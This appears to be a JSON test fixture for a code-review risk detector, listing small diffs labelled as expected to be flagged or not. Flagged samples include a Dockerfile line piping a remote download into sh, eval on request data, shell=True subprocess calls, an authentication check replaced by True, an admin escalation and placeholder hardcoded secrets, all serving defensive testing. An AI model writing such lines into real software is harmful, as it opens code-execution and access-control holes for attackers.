@@ -1,0 +1,122 @@
+[
+  {
+    "id": "docs-readme",
+    "expected_flag": false,
+    "note": "plain docs",
+    "diff": "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n+Updated docs.\n"
+  },
+  {
+    "id": "add-fn-with-test",
+    "expected_flag": false,
+    "note": "new function + its test",
+    "diff": "diff --git a/src/utils.py b/src/utils.py\n--- a/src/utils.py\n+++ b/src/utils.py\n+def f(x):\n+    return x * 2\ndiff --git a/tests/test_utils.py b/tests/test_utils.py\n--- a/tests/test_utils.py\n+++ b/tests/test_utils.py\n+def test_f():\n+    assert f(2) == 4\n"
+  },
+  {
+    "id": "refactor-with-test",
+    "expected_flag": false,
+    "note": "small refactor covered by a test",
+    "diff": "diff --git a/src/format.py b/src/format.py\n--- a/src/format.py\n+++ b/src/format.py\n-    return '$' + str(x)\n+    return f'${x:.2f}'\ndiff --git a/tests/test_format.py b/tests/test_format.py\n--- a/tests/test_format.py\n+++ b/tests/test_format.py\n+def test_money(): assert money(5) == '$5.00'\n"
+  },
+  {
+    "id": "add-comment",
+    "expected_flag": false,
+    "note": "comment only",
+    "diff": "diff --git a/src/app.py b/src/app.py\n--- a/src/app.py\n+++ b/src/app.py\n+# clarify behaviour\n"
+  },
+  {
+    "id": "version-bump",
+    "expected_flag": false,
+    "note": "version bump in config file",
+    "diff": "diff --git a/pyproject.toml b/pyproject.toml\n--- a/pyproject.toml\n+++ b/pyproject.toml\n-version = \"1.1.0\"\n+version = \"1.2.0\"\n"
+  },
+  {
+    "id": "test-file-named-payment",
+    "expected_flag": false,
+    "note": "OVER-FLAG: test file mentions payment",
+    "diff": "diff --git a/tests/test_payment.py b/tests/test_payment.py\n--- a/tests/test_payment.py\n+++ b/tests/test_payment.py\n+def test_charge(): assert charge(0) == 0\n"
+  },
+  {
+    "id": "security-doc",
+    "expected_flag": false,
+    "note": "OVER-FLAG: a security *doc*, harmless",
+    "diff": "diff --git a/docs/security.md b/docs/security.md\n--- a/docs/security.md\n+++ b/docs/security.md\n+Document our security practices.\n"
+  },
+  {
+    "id": "leaked-openai-key",
+    "expected_flag": true,
+    "note": "hardcoded secret",
+    "diff": "diff --git a/config/settings.py b/config/settings.py\n--- a/config/settings.py\n+++ b/config/settings.py\n+API_KEY = \"sk-abcd1234efgh5678ijklmnop\"\n"
+  },
+  {
+    "id": "leaked-aws-key",
+    "expected_flag": true,
+    "note": "hardcoded AWS key",
+    "diff": "diff --git a/src/cloud.py b/src/cloud.py\n--- a/src/cloud.py\n+++ b/src/cloud.py\n+AWS = \"AKIAIOSFODNN7EXAMPLE\"\n"
+  },
+  {
+    "id": "auth-change",
+    "expected_flag": true,
+    "note": "edits authentication",
+    "diff": "diff --git a/src/auth/login.py b/src/auth/login.py\n--- a/src/auth/login.py\n+++ b/src/auth/login.py\n-    return verify(token)\n+    return True\n"
+  },
+  {
+    "id": "payment-change",
+    "expected_flag": true,
+    "note": "edits payment logic",
+    "diff": "diff --git a/src/payment/charge.py b/src/payment/charge.py\n--- a/src/payment/charge.py\n+++ b/src/payment/charge.py\n+    gateway.charge(card, amt * 1.0)\n"
+  },
+  {
+    "id": "delete-migration",
+    "expected_flag": true,
+    "note": "deletes a DB migration",
+    "diff": "diff --git a/db/migrations/0007.sql b/db/migrations/0007.sql\ndeleted file mode 100644\n--- a/db/migrations/0007.sql\n+++ /dev/null\n-CREATE INDEX idx ON users(email);\n"
+  },
+  {
+    "id": "dockerfile-pipe-sh",
+    "expected_flag": true,
+    "note": "edits infra / Dockerfile",
+    "diff": "diff --git a/Dockerfile b/Dockerfile\n--- a/Dockerfile\n+++ b/Dockerfile\n+RUN curl http://x | sh\n"
+  },
+  {
+    "id": "env-secret",
+    "expected_flag": true,
+    "note": "edits a deploy .env",
+    "diff": "diff --git a/deploy/.env b/deploy/.env\n--- a/deploy/.env\n+++ b/deploy/.env\n+DB_PASSWORD=plaintext\n"
+  },
+  {
+    "id": "huge-change",
+    "expected_flag": true,
+    "note": "very large blast radius",
+    "diff": "diff --git a/src/engine.py b/src/engine.py\n--- a/src/engine.py\n+++ b/src/engine.py\n+    step_0()\n+    step_1()\n+    step_2()\n+    step_3()\n+    step_4()\n+    step_5()\n+    step_6()\n+    step_7()\n+    step_8()\n+    step_9()\n+    step_10()\n+    step_11()\n+    step_12()\n+    step_13()\n+    step_14()\n+    step_15()\n+    step_16()\n+    step_17()\n+    step_18()\n+    step_19()\n+    step_20()\n+    step_21()\n+    step_22()\n+    step_23()\n+    step_24()\n+    step_25()\n+    step_26()\n+    step_27()\n+    step_28()\n+    step_29()\n+    step_30()\n+    step_31()\n+    step_32()\n+    step_33()\n+    step_34()\n+    step_35()\n+    step_36()\n+    step_37()\n+    step_38()\n+    step_39()\n+    step_40()\n+    step_41()\n+    step_42()\n+    step_43()\n+    step_44()\n+    step_45()\n+    step_46()\n+    step_47()\n+    step_48()\n+    step_49()\n+    step_50()\n+    step_51()\n+    step_52()\n+    step_53()\n+    step_54()\n+    step_55()\n+    step_56()\n+    step_57()\n+    step_58()\n+    step_59()\n+    step_60()\n+    step_61()\n+    step_62()\n+    step_63()\n+    step_64()\n+    step_65()\n+    step_66()\n+    step_67()\n+    step_68()\n+    step_69()\n+    step_70()\n+    step_71()\n+    step_72()\n+    step_73()\n+    step_74()\n+    step_75()\n+    step_76()\n+    step_77()\n+    step_78()\n+    step_79()\n+    step_80()\n+    step_81()\n+    step_82()\n+    step_83()\n+    step_84()\n+    step_85()\n+    step_86()\n+    step_87()\n+    step_88()\n+    step_89()\n"
+  },
+  {
+    "id": "privilege-escalation",
+    "expected_flag": true,
+    "note": "BLIND SPOT: sets is_admin, no keyword",
+    "diff": "diff --git a/src/api/orders.py b/src/api/orders.py\n--- a/src/api/orders.py\n+++ b/src/api/orders.py\n+    user.is_admin = True\n"
+  },
+  {
+    "id": "eval-injection",
+    "expected_flag": true,
+    "note": "BLIND SPOT: eval(user input)",
+    "diff": "diff --git a/src/handlers/parse.py b/src/handlers/parse.py\n--- a/src/handlers/parse.py\n+++ b/src/handlers/parse.py\n+    return eval(request.data)\n"
+  },
+  {
+    "id": "shell-injection",
+    "expected_flag": true,
+    "note": "BLIND SPOT: shell=True with user cmd",
+    "diff": "diff --git a/src/jobs/run.py b/src/jobs/run.py\n--- a/src/jobs/run.py\n+++ b/src/jobs/run.py\n+    subprocess.run(cmd, shell=True)\n"
+  },
+  {
+    "id": "delete-tests",
+    "expected_flag": true,
+    "note": "removes a test file",
+    "diff": "diff --git a/tests/test_core.py b/tests/test_core.py\ndeleted file mode 100644\n--- a/tests/test_core.py\n+++ /dev/null\n-def test_x(): ...\n"
+  },
+  {
+    "id": "password-literal",
+    "expected_flag": true,
+    "note": "hardcoded password",
+    "diff": "diff --git a/src/db.py b/src/db.py\n--- a/src/db.py\n+++ b/src/db.py\n+password = \"S3cretPassw0rd!\"\n"
+  }
+]
